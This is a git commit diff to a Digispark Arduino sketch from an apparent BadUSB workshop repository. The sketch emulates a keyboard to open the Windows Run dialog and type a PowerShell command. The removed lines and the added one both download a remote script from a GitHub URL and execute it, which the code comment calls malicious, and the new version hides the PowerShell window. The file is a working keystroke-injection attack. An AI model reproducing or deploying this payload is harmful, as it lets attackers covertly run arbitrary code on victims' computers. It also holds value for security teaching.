2aa6a5251fe5f83d27c667e61a9d02d759266237
matheus vrech <whoismath@gmail.com>
2018-01-06 05:27:24 +0000

    Update windows2.ino
    no need write in powershell anymore

--- windows/windows2.ino
+++ windows/windows2.ino
@@ -7,10 +7,7 @@ void setup() {
 
 void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /* Open execute dialog. */
-  delay(50); /* Delay until it opens. */
-  DigiKeyboard.println(F("powershell")); /* Open powershell. */
-  delay(400); /* You may have to adjust this delay. */
-  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-windows.ps1')"));  /* Download and execute malicius script. */
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0); /* Send the command. */
+  delay(100); /* Delay until it opens. */
+  DigiKeyboard.println(F("powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-windows.ps)")); /* Open powershell. */
   for(;;) { /* run just once. */ }
 }
